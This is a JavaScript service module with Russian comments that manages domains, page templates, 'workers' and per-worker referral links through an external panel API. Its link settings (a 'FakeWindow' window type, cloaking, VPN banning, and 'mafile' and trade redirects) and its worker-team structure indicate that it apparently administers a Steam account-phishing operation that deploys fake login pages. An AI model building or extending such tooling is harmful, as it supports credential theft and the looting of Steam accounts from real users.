const {
  getPanelToken,
  filterAvailableDomains,
} = require("../handlers/sitesHandler");
const {
  getDomains,
  getTeamDomains,
  checkDomainAvailability,
  getActualIPs,
  createDomain,
  deleteDomain,
  getSteamLinks,
  findTemplateById,
  createSteamLink,
  updateSteamLink,
  deleteSteamLink,
  getTeamWorkers,
  formatPanelError,
  normalizeWindowType,
  authCredentials,
} = require("./apiService");
const {
  clearTeamReferralForDomain,
  listTeamReferralsFromDb,
  getUserByTelegramId,
  getTeamReferralForDomain,
} = require("./userService");
const {
  getVisibleTemplates,
  addVisibleTemplate,
  removeVisibleTemplate,
  renameVisibleTemplate,
  isTemplateVisible,
  normalizeTemplateId,
} = require("./settingsService");
const { logger } = require("../utils/logger");

function pickActualIp(ips) {
  if (Array.isArray(ips)) return ips[0] || "";
  if (typeof ips === "string") return ips;
  return ips?.ip || ips?.[0] || "";
}

function serializeDomain(domain, ownerId = null) {
  const own =
    ownerId != null && Number.isFinite(Number(ownerId))
      ? Number(domain?.owner) === Number(ownerId)
      : false;
  return {
    id: domain.id,
    domain: domain.domain || "",
    online: Number(domain.online || 0),
    owner: domain.owner ?? null,
    isOwn: own,
    isTeamPublic: domain.isTeamPublic === true || domain.isPublic === true,
    ip: domain.ip || "",
    service: domain.service || "Steam",
    status: domain.status || "",
  };
}

function serializeLink(link) {
  const template = link.template;
  const templateId =
    template && typeof template === "object"
      ? template.id
      : link.templateId ?? template ?? null;
  const templateName =
    (template && typeof template === "object" && template.name) ||
    link.templateName ||
    "";
  return {
    id: link.id,
    path: link.path || "",
    url: link.url || link.link || "",
    windowType: link.windowType || "",
    template: templateId,
    templateName,
    owner: link.owner ?? null,
  };
}

async function withAdminPanel(adminUser, fn) {
  try {
    const auth = await getPanelToken(adminUser);
    return await fn(auth);
  } catch (error) {
    const err = new Error(formatPanelError(error) || error.message || "sites_error");
    err.status = error?.response?.status || 400;
    throw err;
  }
}

async function withWorkerPanel(user, fn) {
  if (!user?.panelUsername || !user?.panelPassword) {
    const err = new Error("У воркера нет аккаунта панели сайтов");
    err.status = 400;
    throw err;
  }
  try {
    const auth = await authCredentials(user.panelUsername, user.panelPassword);
    if (!auth?.token) {
      const err = new Error("Не удалось авторизовать аккаунт воркера в панели");
      err.status = 400;
      throw err;
    }
    return await fn({ token: auth.token, user });
  } catch (error) {
    if (error.status) throw error;
    const err = new Error(formatPanelError(error) || error.message || "sites_error");
    err.status = error?.response?.status || 400;
    throw err;
  }
}

/** Список доменов через team API key — без личного аккаунта админа. */
async function listDomains(_adminUser) {
  try {
    const payload = await getTeamDomains(0, 50);
    const rows = (payload?.rows || []).map((d) => serializeDomain(d, null));
    return {
      ownerId: null,
      panelUsername: "team",
      totalOnline: rows.reduce((sum, row) => sum + row.online, 0),
      ownCount: rows.filter((row) => row.isTeamPublic).length,
      domains: rows,
      viaTeamKey: true,
    };
  } catch (error) {
    const err = new Error(formatPanelError(error) || error.message || "sites_error");
    err.status = error?.response?.status || 400;
    throw err;
  }
}

async function resolveDomainMap() {
  const payload = await getTeamDomains(0, 100);
  const map = new Map();
  for (const row of payload?.rows || []) {
    map.set(Number(row.id), row);
  }
  return map;
}

async function getDomainDetail(adminUser, domainId) {
  const domainMap = await resolveDomainMap();
  const domain = domainMap.get(Number(domainId));
  if (!domain) {
    const err = new Error("Домен недоступен");
    err.status = 404;
    throw err;
  }

  // Ссылки владельца (team key) + рефералки воркеров из Mongo.
  let ownerLinks = [];
  try {
    await withAdminPanel(adminUser, async ({ token }) => {
      const linksPayload = await getSteamLinks(token, domainId, 0, 100);
      ownerLinks = (linksPayload?.rows || []).map(serializeLink);
    });
  } catch (_) {
    // Админ без панели — только рефералки из Mongo.
  }

  const referrals = (await listTeamReferralsFromDb()).filter(
    (row) => Number(row.domainId) === Number(domainId)
  );

  return {
    ownerId: null,
    domain: serializeDomain(domain, null),
    links: ownerLinks,
    referrals: referrals.map((row) => ({
      ...row,
      domainName: domain.domain || "",
      url: `${domain.domain || ""}/${String(row.path || "").replace(/^\/+/, "")}`,
    })),
  };
}

async function previewAddDomain(adminUser, domainName) {
  const domain = String(domainName || "")
    .trim()
    .toLowerCase()
    .replace(/^https?:\/\//, "")
    .replace(/\/.*$/, "");
  if (!domain || !/^[a-z0-9.-]+\.[a-z]{2,}$/i.test(domain)) {
    const err = new Error("Укажите корректный домен, например example.com");
    err.status = 400;
    throw err;
  }
  return withAdminPanel(adminUser, async ({ token }) => {
    const check = await checkDomainAvailability(token, domain);
    if (!check.available) {
      const err = new Error(check.message || "Домен недоступен или уже занят");
      err.status = 409;
      throw err;
    }
    const ip = pickActualIp(await getActualIPs(token));
    return { domain, ip, available: true };
  });
}

async function addDomain(adminUser, domainName) {
  const preview = await previewAddDomain(adminUser, domainName);
  return withAdminPanel(adminUser, async ({ token, ownerId }) => {
    const created = await createDomain(token, {
      domain: preview.domain,
      type: "IP",
      service: "Steam",
      isPublic: false,
      isTransit: false,
    });
    return {
      created: serializeDomain(
        {
          id: created?.id || created?.data?.id,
          domain: created?.domain || preview.domain,
          online: 0,
          owner: ownerId,
          ip: created?.ip || preview.ip,
          service: "Steam",
        },
        ownerId
      ),
      bindIp: preview.ip,
    };
  });
}

async function removeDomain(adminUser, domainId) {
  return withAdminPanel(adminUser, async ({ token, ownerId }) => {
    const payload = await getDomains(token, 0, 50);
    const domain = (payload?.rows || []).find((row) => Number(row.id) === Number(domainId));
    if (!domain) {
      const err = new Error("Домен не найден");
      err.status = 404;
      throw err;
    }
    if (Number(domain.owner) !== Number(ownerId)) {
      const err = new Error("Можно удалить только свой домен");
      err.status = 403;
      throw err;
    }
    await deleteDomain(token, domainId);
    await clearTeamReferralForDomain(adminUser.telegramId, domainId);
    return { ok: true };
  });
}

async function listTemplates(_adminUser) {
  const templates = await getVisibleTemplates();
  return {
    templates: templates.map((t) => ({
      id: t.id,
      name: t.name || `Template #${t.id}`,
      preview: t.preview || "",
    })),
  };
}

async function listTemplateVisibility(_adminUser) {
  const templates = await getVisibleTemplates();
  return {
    templates: templates.map((t) => ({
      id: t.id,
      name: t.name || `Template #${t.id}`,
      preview: t.preview || "",
      enabled: true,
    })),
  };
}

async function enableTemplateById(adminUser, templateId, { name } = {}) {
  const id = normalizeTemplateId(templateId);
  if (!id) {
    const err = new Error("Укажите корректный ID шаблона");
    err.status = 400;
    throw err;
  }
  const customName = String(name || "").trim().slice(0, 80);
  let found = null;
  try {
    found = await withAdminPanel(adminUser, async ({ token }) => findTemplateById(token, id));
  } catch {
    // Можно включить ID без каталога uproject — имя подставится позже.
  }
  const templates = await addVisibleTemplate({
    id,
    name: customName || found?.name || `Template #${id}`,
    preview: found?.preview || "",
  });
  return {
    templates,
    template: templates.find((row) => row.id === id),
    resolved: Boolean(found),
    customName: Boolean(customName),
  };
}

async function renameTemplateById(_adminUser, templateId, name) {
  try {
    const templates = await renameVisibleTemplate(templateId, name);
    const id = normalizeTemplateId(templateId);
    return {
      templates,
      template: templates.find((row) => row.id === id),
    };
  } catch (error) {
    const err = new Error(error.message || "Не удалось переименовать");
    err.status = 400;
    throw err;
  }
}

async function disableTemplateById(_adminUser, templateId) {
  const id = normalizeTemplateId(templateId);
  if (!id) {
    const err = new Error("Укажите корректный ID шаблона");
    err.status = 400;
    throw err;
  }
  const templates = await removeVisibleTemplate(id);
  return { templates };
}

async function createLink(adminUser, domainId, { path = "", templateId, windowType } = {}) {
  return withAdminPanel(adminUser, async ({ token, ownerId }) => {
    const payload = await getDomains(token, 0, 50);
    const domain = filterAvailableDomains(payload?.rows || [], ownerId).find(
      (row) => Number(row.id) === Number(domainId)
    );
    if (!domain) {
      const err = new Error("Домен недоступен");
      err.status = 404;
      throw err;
    }
    const tpl = Number(templateId);
    if (!Number.isFinite(tpl) || tpl < 1) {
      const err = new Error("Выберите шаблон");
      err.status = 400;
      throw err;
    }
    if (!(await isTemplateVisible(tpl))) {
      const err = new Error("Шаблон недоступен. Включите его ID в разделе «Шаблоны».");
      err.status = 400;
      throw err;
    }
    const cleanPath = String(path || "").trim().replace(/^\/+/, "");
    const created = await createSteamLink(token, {
      path: cleanPath,
      windowType: normalizeWindowType(windowType || "FakeWindow"),
      domain: Number(domainId),
      template: tpl,
      cloaking: false,
      ban_vpn: false,
      iframe: true,
      logError: true,
      mafileError: false,
      mafileSteamRedirect: true,
      tradeError: true,
      randPath: !cleanPath,
    });
    return { link: serializeLink(created?.data || created || {}) };
  });
}

async function listWorkers(adminUser) {
  try {
    return await withAdminPanel(adminUser, async ({ token, ownerId }) => {
      const payload = await getTeamWorkers(token, 0, 100);
      const rows = (payload?.rows || []).map((row) => ({
        id: row.id,
        username: row.username || "",
        telegram: row.telegram || "",
        isOwner: Number(row.id) === Number(ownerId),
      }));
      return { ownerId, workers: rows };
    });
  } catch (error) {
    // Fallback: воркеры из Mongo с рефералками / panel-аккаунтами.
    const referrals = await listTeamReferralsFromDb();
    const byTg = new Map();
    for (const row of referrals) {
      if (!byTg.has(row.telegramId)) {
        byTg.set(row.telegramId, {
          id: null,
          username: row.panelUsername || row.username || "",
          telegram: row.telegramId,
          isOwner: false,
        });
      }
    }
    return { ownerId: null, workers: [...byTg.values()], viaMongo: true };
  }
}

async function listTeamReferrals(_adminUser) {
  const [items, domainMap] = await Promise.all([
    listTeamReferralsFromDb(),
    resolveDomainMap().catch(() => new Map()),
  ]);
  const templates = await getVisibleTemplates();
  const referrals = items.map((row) => {
    const domain = domainMap.get(Number(row.domainId));
    const domainName = domain?.domain || "";
    return {
      ...row,
      domainName,
      url: domainName
        ? `${domainName}/${String(row.path || "").replace(/^\/+/, "")}`
        : String(row.path || ""),
      online: Number(domain?.online || 0),
    };
  });
  return {
    total: referrals.length,
    referrals,
    templates: templates.map((t) => ({
      id: t.id,
      name: t.name || `Template #${t.id}`,
    })),
  };
}

async function updateTeamReferral(
  _adminUser,
  { telegramId, domainId },
  { templateId, windowType } = {}
) {
  const user = await getUserByTelegramId(telegramId);
  if (!user) {
    const err = new Error("Воркер не найден");
    err.status = 404;
    throw err;
  }
  const existing = await getTeamReferralForDomain(telegramId, domainId);
  if (!existing?.panelLinkId) {
    const err = new Error("Реферальная ссылка не найдена");
    err.status = 404;
    throw err;
  }

  const patch = {};
  if (templateId != null && templateId !== "") {
    const tpl = Number(templateId);
    if (!Number.isFinite(tpl) || tpl < 1) {
      const err = new Error("Некорректный ID шаблона");
      err.status = 400;
      throw err;
    }
    if (!(await isTemplateVisible(tpl))) {
      const err = new Error("Шаблон недоступен. Включите его в разделе «Шаблоны».");
      err.status = 400;
      throw err;
    }
    patch.template = tpl;
  }
  if (windowType) patch.windowType = normalizeWindowType(windowType);
  if (!Object.keys(patch).length) {
    const err = new Error("Нечего обновлять");
    err.status = 400;
    throw err;
  }

  return withWorkerPanel(user, async ({ token }) => {
    let liveWindow = patch.windowType;
    if (!liveWindow) {
      try {
        const links = await getSteamLinks(token, domainId, 0, 50);
        const row = (links?.rows || []).find(
          (link) => Number(link.id) === Number(existing.panelLinkId)
        );
        liveWindow = row?.windowType;
      } catch (_) {
        /* ignore */
      }
    }
    await updateSteamLink(token, domainId, existing.panelLinkId, {
      ...patch,
      windowType: normalizeWindowType(liveWindow || "FakeWindow"),
    });
    return { ok: true, telegramId: String(telegramId), domainId: Number(domainId), patch };
  });
}

async function deleteTeamReferral(_adminUser, { telegramId, domainId }) {
  const user = await getUserByTelegramId(telegramId);
  if (!user) {
    const err = new Error("Воркер не найден");
    err.status = 404;
    throw err;
  }
  const existing = await getTeamReferralForDomain(telegramId, domainId);
  if (!existing) {
    const err = new Error("Реферальная ссылка не найдена");
    err.status = 404;
    throw err;
  }

  if (existing.panelLinkId && user.panelUsername && user.panelPassword) {
    try {
      await withWorkerPanel(user, async ({ token }) => {
        let windowType = "FakeWindow";
        try {
          const links = await getSteamLinks(token, domainId, 0, 50);
          const row = (links?.rows || []).find(
            (link) => Number(link.id) === Number(existing.panelLinkId)
          );
          if (row?.windowType) windowType = row.windowType;
        } catch (_) {
          /* ignore */
        }
        await deleteSteamLink(token, domainId, existing.panelLinkId, { windowType });
      });
    } catch (error) {
      logger.warn(
        "Failed to soft-delete panel referral link",
        telegramId,
        domainId,
        error.message
      );
    }
  }

  await clearTeamReferralForDomain(telegramId, domainId);
  return { ok: true, telegramId: String(telegramId), domainId: Number(domainId) };
}

module.exports = {
  listDomains,
  getDomainDetail,
  previewAddDomain,
  addDomain,
  removeDomain,
  listTemplates,
  listTemplateVisibility,
  enableTemplateById,
  renameTemplateById,
  disableTemplateById,
  createLink,
  listWorkers,
  listTeamReferrals,
  updateTeamReferral,
  deleteTeamReferral,
};
